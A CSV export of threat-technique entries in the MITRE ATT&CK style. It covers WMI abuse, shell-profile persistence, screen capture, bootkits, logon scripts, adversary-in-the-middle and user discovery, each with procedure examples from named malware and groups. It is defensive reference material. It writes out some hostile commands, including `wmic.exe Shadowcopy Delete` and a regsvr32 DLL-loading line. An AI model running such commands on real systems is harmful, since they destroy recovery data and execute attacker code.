ID,Name,Description,Procedures,Revoked
T1066,Indicator Removal from Tools,"If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.  A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing] or otherwise modify the file so it has a different signature, and then re-use the malware.",[],True
T1047,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.  The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services] such as [Distributed Component Object Model] and [Windows Remote Management] Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.   An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery] as well as [Execution] of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery]  **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell] as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.","['[Sardonic] can use WMI to execute PowerShell commands on a compromised machine.', '[Meteor] can use `wmic.exe` as part of its effort to delete shadow copies.', '[Cinnamon Tempest] has used [Impacket] for lateral movement via WMI.', '[RogueRobin] uses various WMI queries to check if the sample is running in a sandbox.', '[menuPass] has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.', '[SUNBURST] used the WMI query <code>Select * From Win32_SystemDriver</code> to retrieve a driver listing.', 'During [C0015] the threat actors used `wmic` and `rundll32` to load [Cobalt Strike] onto a target host.', 'A [BlackEnergy] 2 plug-in uses WMI to gather victim host details.', '[FunnyDream] can use WMI to open a Windows command shell on a remote machine.', '[jRAT] uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.', '[Emotet] has used WMI to execute powershell.exe.', '[Gamaredon Group] has used WMI to execute scripts used for discovery.', '[FIVEHANDS] can use WMI to delete files on a  target machine.', 'One variant of [Zebrocy] uses WMI queries to gather information.', '[APT32] used WMI to deploy their tools on remote machines and to gather information about the Outlook process.', '[Mosquito] installer uses WMI to search for antivirus display names.', '[Mustang Panda] has executed PowerShell scripts via WMI.', '[MuddyWater] has used malware that leveraged WMI for execution and querying host information.', '[Agent Tesla] has used wmi queries to gather information from the system. ', '[PoshC2] has a number of modules that use WMI to execute tasks.', '[Bumblebee] can use WMI to gather system information and to spawn processes for code injection.', '[Wizard Spider] has used WMI and LDAP queries for network discovery and to move laterally. [Wizard Spider] has also used batch scripts to leverage WMIC to deploy ransomware.', '[Leviathan] has used WMI for execution.', '[Action RAT] can use WMI to gather AV products installed on an infected host.', '[EvilBunny] has used WMI to gather information about the system.', '[Stuxnet] used WMI with an <code>explorer.exe</code> token to execute on a remote share.', '[PowerSploit] <code>Invoke-WmiCommand</code> CodeExecution module uses WMI to execute and retrieve the output from a [PowerShell] payload.', '[POWRUNER] may use WMI when collecting information about a victim.', '[SocGholish] has used WMI calls for script execution and system profiling. ', '[FlawedAmmyy] leverages WMI to enumerate anti-virus on the victim.', '[FIN7] has used WMI to install malware on targeted systems.', '[GALLIUM] used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.', '[Volt Typhoon] has leveraged WMIC including for execution and remote system discovery.', '[ProLock] can use WMIC to execute scripts on targeted hosts.', '[POWERSTATS] can use WMI queries to retrieve data from compromised hosts.', '[Akira] will leverage COM objects accessed through WMI during execution to evade detection.', '[Blue Mockingbird] has used wmic.exe to set environment variables.', '[SILENTTRINITY] can use WMI for lateral movement.', '[OopsIE] uses WMI to perform discovery techniques.', '[Naikon] has used WMIC.exe for lateral movement.', '[Brute Ratel C4] can use WMI to move laterally.', '[Koadic] can use WMI to execute commands.', '[Lazarus Group] has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.', '[Sibot] has used WMI to discover network connections and configurations. [Sibot] has also used the Win32_Process class to execute a malicious DLL.', 'The [DustySky] dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.', '[WannaCry] utilizes <code>wmic</code> to delete shadow copies.', '[EKANS] can use Windows Mangement Instrumentation (WMI) calls to execute operations.', '[RATANKBA] uses WMI to perform process monitoring.', '[MoleNet] can perform WMI commands on the system.', '[BlackCat] can use `wmic.exe` to delete shadow copies on compromised networks.', '[NotPetya] can use <code>wmic</code> to help propagate itself across a network.', '[HALFBAKED] can use WMI queries to gather system information.', '[Sandworm Team] has used [Impacket] WMIexec module for remote code execution and VBScript to run WMI queries.', '[StoneDrill] has used the WMI command-line (WMIC) utility to run tasks.', '[Remexi] executes received commands with wmic.exe (for WMI commands). ', '[Earth Lusca] used a VBA script to execute WMI.', '[Empire] can use WMI to deliver a payload to a remote host. ', '[CrackMapExec] can execute remote commands using Windows Management Instrumentation.\t', '[Impacket] wmiexec module can be used to execute commands through WMI.', '[Indrik Spider] has used WMIC to execute commands on remote computers. ', '[Snip3] can query the WMI class `Win32_ComputerSystem` to gather information.', '[FELIXROOT] uses WMI to query the Windows Registry.', '[Olympic Destroyer] uses WMI to help propagate itself across a network.', '[TA2541] has used WMI to query targeted systems for security products.', '[HermeticWizard] can use WMI to create a new process on a remote machine via `C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll`.', '[HELLOKITTY] can use WMI to delete volume shadow copies.', '[Stealth Falcon] malware gathers system information via Windows Management Instrumentation (WMI).', '[IcedID] has used WMI to execute binaries.', '[REvil] can use WMI to monitor for and kill specific processes listed in its configuration file.', 'During [Frankenstein] the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.', '[Astaroth] uses WMIC to execute payloads. ', '[DarkTortilla] can use WMI queries to obtain system information.', '[SVCReady] can use `WMI` queries to detect the presence of a virtual machine environment. ', '[DarkWatchman] can use WMI to execute commands.', 'During [C0027] [Scattered Spider] used Windows Management Instrumentation (WMI) to move laterally via [Impacket]', '[APT29] used WMI to steal credentials and execute backdoors at a future time.', '[Black Basta] has used WMI to execute files over the network.', 'During [Operation Dream Job] [Lazarus Group] used WMIC to executed a remote XSL script.', '[Avaddon] uses wmic.exe to delete shadow copies.', '[Octopus] has used wmic.exe for local discovery information.', '[HOPLIGHT] has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.\t', 'During the [2016 Ukraine Electric Power Attack] WMI in scripts were used for remote execution and system surveys. ', '[PyDCrypt] has attempted to execute with WMIC.', ""[Maze] has used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network. "", '[OilRig] has used WMI for execution.', 'During [Operation Wocao] threat actors has used WMI to execute commands.', '[Windshift] has used WMI to collect information about target machines.', '[FIN6] has used WMI to automate the remote execution of PowerShell scripts.\t', '[DEATHRANSOM] has the ability to use WMI to delete volume shadow copies.', '[ToddyCat] has used WMI to execute scripts for post exploit document collection.', 'The [Deep Panda] group is known to utilize WMI for lateral movement.', '[BADHATCH] can utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine.', 'A [Threat Group-3390] tool can use WMI to execute a binary.', '[Ursnif] droppers have used WMI classes to execute [PowerShell] commands.', 'During the [SolarWinds Compromise] [APT29] used WMI for the remote execution of files for lateral movement.', '[Cobalt Strike] can use WMI to deliver a payload to a remote host.', '[SharpStage] can use WMI for execution.', '[QakBot] can execute WMI queries to gather information.', '[Micropsia] searches for anti-virus software and firewall products installed on the victim’s machine using WMI.', '[Bazar] can execute a WMI query to gather information about the installed antivirus engine.', '[Chimera] has used WMIC to execute remote commands.', '[Netwalker] can use WMI to delete Shadow Volumes.\t', 'During [FunnyDream] the threat actors used `wmiexec.vbs` to run remote commands.', '[FIN13] has utilized `WMI` to execute commands and move laterally on compromised Windows machines.', '[KOMPROGO] is capable of running WMI queries.', '[Valak] can use <code>wmic process call create</code> in a scheduled task to launch plugins and for execution.', '[EVILNUM] has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.', '[Magic Hound] has used a tool to run `cmd /c wmic computersystem get domain` for discovery.', '[SysUpdate] can use WMI for execution on a compromised host.', '[CharmPower] can use `wmic` to gather information from a system.', '[Kazuar] obtains a list of running processes through WMI querying.', '[APT41] used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via [PowerSploit]', 'During [C0018] the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (`wmiprvse.exe`) to execute a variety of encoded PowerShell scripts using the `DownloadString` method.', '[Lucifer] can use WMI to log into remote machines for propagation.', '[FIN8] malicious spearphishing payloads use WMI to launch malware and spawn `cmd.exe` execution. [FIN8] has also used WMIC and the [Impacket] suite for lateral movement, as well as during and post compromise cleanup activities.', '[GravityRAT] collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).', '[UNC2452] used WMI for the remote execution of files for lateral movement.', '[Frankenstein] has used WMI queries to check if various security applications were running, as well as the operating system version.', '[Operation Wocao] has used WMI to execute commands.', '[Cobalt Strike] can use WMI to deliver a payload to a remote host.', 'APT34 has used WMI for execution.']",False
T1156,Malicious Shell Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.   Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files . These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot).   For macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",[],True
T1113,Screen Capture,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>. ","['[Pteranodon] can capture screenshots at a configurable interval.', '[GRIFFON] has used a screenshot module that can be used to take a screenshot of the remote system.', 'A [JHUHUGIT] variant takes screenshots by simulating the user pressing the ""Take Screenshot"" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.', '[Agent Tesla] can capture screenshots of the victim’s desktop.', '[Dragonfly] has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).', '[Pupy] can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.', '[TURNEDUP] is capable of taking screenshots.', '[Trojan.Karagany] can take a desktop screenshot and save the file into <code>\\ProgramData\\Mail\\MailAg\\shot.png</code>.', '[FinFisher] takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.', '[Cobian RAT] has a feature to perform screen capture.', '[BADNEWS] has a command to take a screenshot and send it to the C2 server.', '[Ramsay] can take screenshots every 30 seconds as well as when an external removable storage device is connected.', '[BlackEnergy] is capable of taking screenshots.', '[Carbanak] performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.', '[ObliqueRAT] can capture a screenshot of the current screen. ', '[Clambling] has the ability to capture screenshots.', '[PcShare] can take screen shots of a compromised machine.', '[Empire] is capable of capturing screenshots on Windows and macOS systems.', '[Mispadu] has the ability to capture screenshots on compromised hosts. ', '[CrossRAT] is capable of taking screen captures.', ""[Prikormka] contains a module that captures screenshots of the victim's desktop."", '[BRONZE BUTLER] has used a tool to capture screenshots.', '[BISCUIT] has a command to periodically take screenshots of the system.', ""[MacMa] has used Apple’s Core Graphic APIs, such as `CGWindowListCreateImageFromArray`, to capture the user's screen and open windows."", '[BADHATCH] can take screenshots and send them to an actor-controlled C2 server.', '[njRAT] can capture screenshots of the victim’s machines.', '[Turian] has the ability to take screenshots.', '[Gamaredon Group] malware can take screenshots of the compromised computer every minute.\t', '[Cannon] can take a screenshot of the desktop.', 'A variant of [Zebrocy] captures screenshots of the victim’s machine in JPEG and BMP format.', '[TajMahal] has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.', '[Cobalt Strike] Beacon payload is capable of capturing screenshots.', ""[SharpStage] has the ability to capture the victim's screen."", '[InvisiMole] can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.', ""[OilRig] has a tool called CANDYKING to capture a screenshot of user's desktop."", '[APT28] has used tools to take screenshots from victims.', '[RedLeaves] can capture screenshots.', '[SILENTTRINITY] can take a screenshot of the current desktop.', '[RDAT] can take a screenshot on the infected system.\t', '[Zeus Panda] can take screenshots of the victim’s machine.', '[ZxShell] can capture screenshots.', '[MoustachedBouncer] has used plugins to take screenshots on targeted systems.', '[POORAIM] can perform screen capturing.', '[RCSession] can capture screenshots from a compromised host.', '[UPPERCUT] can capture desktop screenshots in the PNG format and send them to the C2 server.', '[Brute Ratel C4] can take screenshots on compromised hosts.', ""[GOLD SOUTHFIELD] has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines."", '[LitePower] can take system screenshots and save them to `%AppData%`.', '[BadPatch] captures screenshots in .jpg format and then exfiltrates them.', '[Aria-body] has the ability to capture screenshots on compromised hosts.', '[Valak] has the ability to take screenshots on a compromised host.\t ', ""[Rover] takes screenshots of the compromised system's desktop and saves them to <code>C:\\system\\screenshot.bmp</code> for exfiltration every 60 minutes."", '[Lizar] can take JPEG screenshots of an infected system. ', '[Magic Hound] malware can take a screenshot and upload the file to its C2 server.', '[Peppy] can take screenshots on targeted systems.', '[Daserf] can take screenshots.', '[TinyZBot] contains screen capture functionality.', '[MuddyWater] has used malware that can capture screenshots of the victim’s machine.', '[Crimson] contains a command to perform screen captures.', '[CHOPSTICK] has the capability to capture screenshots.', '[ZLib] has the ability to obtain screenshots of the compromised system.', '[CosmicDuke] takes periodic screenshots and exfiltrates them.', '[Attor] has a plugin that captures screenshots of the target applications.', '[Silence] can capture victim screen activity.', '[metaMain] can take and save screenshots.', '[SVCReady] can take a screenshot from an infected host.', '[PowerSploit] <code>Get-TimedScreenshot</code> Exfiltration module can take screenshots at regular intervals.', '[Flame] can take regular screenshots when certain applications are open that are sent to the command and control server.', '[StrifeWater] has the ability to take screen captures.', '[VERMIN] can perform screen captures of the victim’s machine.', '[Ursnif] has used hooked APIs to take screenshots.', '[Woody RAT] has the ability to take a screenshot of the infected host desktop using Windows GDI+. ', '[LookBack] can take desktop screenshots.', '[ECCENTRICBANDWAGON] can capture screenshots and store them locally.', '[Mafalda] can take a screenshot of the target machine and save it to a file.', '[Kivars] has the ability to capture screenshots on the infected host.', '[Sliver] can take screenshots of the victim’s active display.', ""[DOGCALL] is capable of capturing screenshots of the victim's machine."", ""Malware used by [Group5] is capable of watching the victim's screen."", '[SysUpdate] has the ability to capture screenshots.', '[HyperBro] has the ability to take screenshots.', 'The [FunnyDream] ScreenCap component can take screenshots on a compromised host.', '[APT39] has used a screen capture utility to take screenshots on a compromised host.', '[Chrommme] has the ability to capture screenshots.', ""[FruitFly] takes screenshots of the user's desktop."", '[Remcos] takes automated screenshots of the infected machine.', '[NightClub] can load a module to call `CreateCompatibleDC` and `GdipSaveImageToStream` for screen capture.', '[FlawedAmmyy] can capture screenshots.', '[Matryoshka] is capable of performing screen captures.', '[DustySky] captures PNG screenshots of the main screen.', '[Bandook] is capable of taking an image of and uploading the current desktop.', '[Hydraq] includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.', '[RainyDay] has the ability to capture screenshots.', '[Kasidet] has the ability to initiate keylogging and screen captures.', '[KONNI] can take screenshots of the victim’s machine.', '[gh0st RAT] can capture the victim’s screen remotely.', '[Kazuar] captures screenshots of the victim’s screen.', '[EvilGrab] has the capability to capture screenshots.', '[HALFBAKED] can obtain screenshots from the victim.', '[Metamorfo] can collect screenshots of the victim’s machine. ', '[yty] collects screenshots of the victim machine.', '[Micropsia] takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.', '[SMOKEDHAM] can capture screenshots of the victim’s desktop.', '[PlugX] allows the operator to capture screenshots.', '[KeyBoy] has a command to perform screen grabbing.', '[Socksbot] can take screenshots.', '[XAgentOSX] contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.', '[KEYMARBLE] can capture screenshots of the victim’s machine.', '[ConnectWise] can take screenshots on remote hosts.', '[ROKRAT] can capture screenshots of the infected system using the `gdi32` library.', '[Revenge RAT] has a plugin for screen capture.', '[Derusbi] is capable of performing screen captures.', ""[NETWIRE] can capture the victim's screen."", '[Proton] captures the content of the desktop with the screencapture binary.', '[AppleSeed] can take screenshots on a compromised host by calling a series of APIs.', '[Remexi] takes screenshots of windows of interest.', '[SHUTTERSPEED] can capture screenshots.', '[PoetRAT] has the ability to take screen captures.', '[Cadelspy] has the ability to capture screenshots and webcam photos.', '[T9000] can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.', '[CharmPower] has the ability to capture screenshots.', '[Carberp] can capture display screenshots with the screens_dll.dll plugin.', '[BLUELIGHT] has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter.', '[MacSpy] can capture screenshots of the desktop over multiple monitors.', '[SLOTHFULMEDIA] has taken a screenshot of a victim\'s desktop, named it ""Filter3.jpg"", and stored it in the local directory.', '[RogueRobin] has a command named <code>$screenshot</code> that may be responsible for taking screenshots of the victim machine.', '[Chaes] can capture screenshots of the infected machine.', '[POWERSTATS] can retrieve screenshots from compromised hosts.', '[jRAT] has the capability to take screenshots of the victim’s machine.', '[RemoteUtilities] can take screenshots on a compromised host.', '[Dark Caracal] took screenshots using their Windows malware.', '[POWRUNER] can capture a screenshot from a victim.', '[AsyncRAT] has the ability to view the screen on compromised hosts.', '[Azorult] can capture screenshots of the victim’s machines.', '[HotCroissant] has the ability to do real time screen viewing on an infected host.', '[StoneDrill] can take screenshots.\t', '[Catchamas] captures screenshots based on specific keywords in the window’s title.', '[NKAbuse] can take screenshots of the victim machine.', '[FIN7] captured screenshots and desktop video recordings.', '[Cardinal RAT] can capture screenshots.', ""[XCSSET] saves a screen capture of the victim's system with a numbered filename and <code>.jpg</code> extension. Screen captures are taken at specified intervals based on the system. "", '[Octopus] can capture screenshots of the victims’ machine.', '[RTM] can capture screenshots.', ""[QuietSieve] has taken screenshots every five minutes and saved them to the user's local Application Data folder under `Temp\\SymbolSourceSymbols\\icons` or `Temp\\ModeAuto\\icons`."", '[Machete] captures screenshots.', '[Janicab] captured screenshots and sent them out to a C2 server.', '[MarkiRAT] can capture screenshots that are initially saved as ‘scr.jpg’.', '[Dragonfly 2.0] has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).', '[Cobalt Strike] ""beacon"" payload is capable of capturing screenshots.', ""APT34 has a tool called CANDYKING to capture a screenshot of user's desktop."", 'Dragonfly has performed screen captures of victims.']",
T1067,Bootkit,"A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).   Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.  ### Master Boot Record The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.   ### Volume Boot Record The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",[],True
T1037,Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.    Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.   An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","['[APT29] has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup.', 'Depending on the Linux distribution and when executing with root permissions, [RotaJakiro] may install persistence using a `.conf` file in the `/etc/init/` folder.', '[Rocke] has installed an ""init.d"" startup script to maintain persistence.\t']",False
T1557,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing] [Transmitted Data Manipulation] or replay attacks ([Exploitation for Credential Access] By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.  For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token] and session cookies ([Steal Web Session Cookie] [Downgrade Attack] can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.  Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation] Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses] and/or in support of a [Network Denial of Service]","['[Dok] proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.', '[Kimsuky] has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.']",False
T1033,System Owner/User Discovery,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping] The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.  On network devices, [Network Device CLI] commands such as `show users` and `show ssh` can be used to display users currently logged into the device.","['[Trojan.Karagany] can gather information about the user on a compromised host.', '[PoetRAT] sent username, computer name, and the previously generated UUID in reply to a ""who"" command from C2.', '[Revenge RAT] gathers the username from the system.', '[DRATzarus] can obtain a list of users from an infected machine.', '[TrickBot] can identify the user and groups the user belongs to on a compromised host.', '[ShadowPad] has collected the username of the victim system.', '[Squirrelwaffle] can collect the user name from a compromised host.', '[Emotet] has enumerated all users connected to network shares.', '[APT38] has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.', '[NBTscan] can list active users on the system.\t', '[NDiskMonitor] obtains the victim username and encrypts the information to send over its C2 channel.', '[BabyShark] has executed the <code>whoami</code> command.', '[WellMess] can collect the username on the victim machine to send to C2.', '[MacMa] can collect the username from the compromised machine.', '[SslMM] sends the logged-on username to its hard-coded C2.', '[BLUELIGHT] can collect the username on a compromised host.', ""[StrifeWater] can collect the user name from the victim's machine."", '[Bumblebee] has the ability to identify the user name.', '[Dyre] has the ability to identify the users on a compromised host.', '[Woody RAT] can retrieve a list of user accounts and usernames from an infected machine.', '[Diavol] can collect the username from a compromised host.', '[Epic] collects the user name from the victim’s machine.', '[POWERSTATS] has the ability to identify the username on the compromised host.', '[FIN8] has executed the command `quser` to display the session details of a compromised machine. ', '[S-Type] has run tests to determine the privilege level of the compromised user.', '[MarkiRAT] can retrieve the victim’s username.', '[Ke3chang] has used implants capable of collecting the signed-in username.', '[Mosquito] runs <code>whoami</code> on the victim’s machine.', '[Unknown Logger] can obtain information about the victim usernames.', '[Azorult] can collect the username from the victim’s machine.', '[metaMain] can collect the username from a compromised host.', '[FIN7] has used the command `cmd.exe /C quser` to collect user session information.', '[AuTo Stealer] has the ability to collect the username from an infected host.', '[HAFNIUM] has used `whoami` to gather user information.', 'During [C0017] [APT41] used `whoami` to gather information from victim machines.', '[Exaramel for Linux] can run <code>whoami</code> to identify the system owner.', '[SysUpdate] can collect the username from a compromised host.', '[RATANKBA] runs the <code>whoami</code> and <code>query user</code> commands.', '[FlawedAmmyy] enumerates the current user during the initial infection.', '[Rising Sun] can detect the username of the infected host.\t', '[UPPERCUT] has the capability to collect the current logged on user’s username from a machine.', '[WINERACK] can gather information on the victim username.', '[SynAck] gathers user names from infected hosts.', '[XAgentOSX] contains the getInfoOSX function to return the OS X version as well as the current user.', '[WINDSHIELD] can gather the victim user name.', '[Koadic] can identify logged in users across the domain and views user sessions.', '[LitePower] can determine if the current user has admin privileges.', '[APT19] used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.', '[Octopus] can collect the username from the victim’s machine.', '[SideTwist] can collect the username on a targeted system.', '[SpeakUp] uses the <code>whoami</code> command. ', '[GrimAgent] can identify the user id on a target machine.', '[Cardinal RAT] can collect the username from a victim machine.', '[Pupy] can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.', '[Lokibot] has the ability to discover the username on the infected host.', '[FIN10] has used Meterpreter to enumerate users on remote systems.', '[Agent Tesla] can collect the username from the victim’s machine.', '[MechaFlounder] has the ability to identify the username and hostname on a compromised host.', ""[APT32] collected the victim's username and executed the <code>whoami</code> command on the victim's machine. [APT32] executed shellcode to collect the username on the victim's machine. "", '[KONNI] can collect the username from the victim’s machine.', ""[Gold Dragon] collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server."", 'During [Operation Wocao] threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.', '[Lucifer] has the ability to identify the username on a compromised host.', '[Felismus] collects the current username and sends it to the C2 server.', '[APT39] used [Remexi] to collect usernames from the system.', '[Milan] can identify users registered to a targeted machine.', '[Zebrocy] gets the username from the system.', '[QakBot] can identify the user name on a compromised system.', '[Cannon] can gather the username from the system.', '[SLOTHFULMEDIA] has collected the username from a victim machine.', '[Turian] can retrieve usernames.', '[SodaMaster] can identify the username on a compromised host.', '[APT37] identifies the victim username.', 'Various [Lazarus Group] malware enumerates logged-on users.', 'During [Night Dragon] threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.', '[POWRUNER] may collect information about the currently logged in user by running <code>whoami</code> on a victim.', '[InvisiMole] lists local users and session information.', '[Aria-body] has the ability to identify the username on a compromised host.', '[AsyncRAT] can check if the current user of a compromised system is an administrator. ', ""[Grandoreiro] can collect the username from the victim's machine."", '[Tropic Trooper] used <code>letmein</code> to scan for saved usernames on the target system.', '[Threat Group-3390] has used `whoami` to collect system user information.', '[Chaes] has collected the username and UID from the infected machine.', '[Valak] can gather information regarding the user.', 'During [C0018] the threat actors collected `whoami` information via PowerShell scripts.', '[BADHATCH] can obtain logged user information from a compromised machine and can execute the command `whoami.exe`.', ""[PowerDuke] has commands to get the current user's name and SID."", '[Earth Lusca] collected information on user accounts via the <code>whoami</code> command.', '[QuasarRAT] can enumerate the username and account type.', '[RogueRobin] collects the victim’s username and whether that user is an admin.', '[HAWKBALL] can collect the user name of the system.', '[Kwampirs] collects registered owner details by using the commands <code>systeminfo</code> and <code>net config workstation</code>.', '[ZxShell] can collect the owner and organization information from the target workstation. ', '[Micropsia] collects the username from the victim’s machine.', '[Explosive] has collected the username from the infected host. ', '[Agent.btz] obtains the victim username and saves it to a file.', '[SVCReady] can collect the username from an infected host.', '[Crimson] can identify the user on a targeted system.', '[DownPaper] collects the victim username and sends it to the C2 server.', '[Okrum] can collect the victim username.', 'can collect the victim user name.', '[Lizar] can collect the username from the system. ', 'The OsInfo function in [Komplex] collects the current running username.', '[SombRAT] can execute <code>getinfo</code>  to identify the username on a compromised host.', '[Kazuar] gathers information on users.', 'During [Operation CuckooBees] the threat actors used the `query user` and `whoami` commands as part of their advanced reconnaissance.', '[WellMail] can identify the current username on the victim system.', '[BloodHound] can collect information on user sessions.', '[JPIN] can obtain the victim user name.', '[Magic Hound] malware has obtained the victim username and sent it to the C2 server.', '[ZIRCONIUM] has used a tool to capture the username on a compromised host in order to register it with C2.', '[STARWHALE] can gather the username from an infected host. ', '[Rifdoor] has the ability to identify the 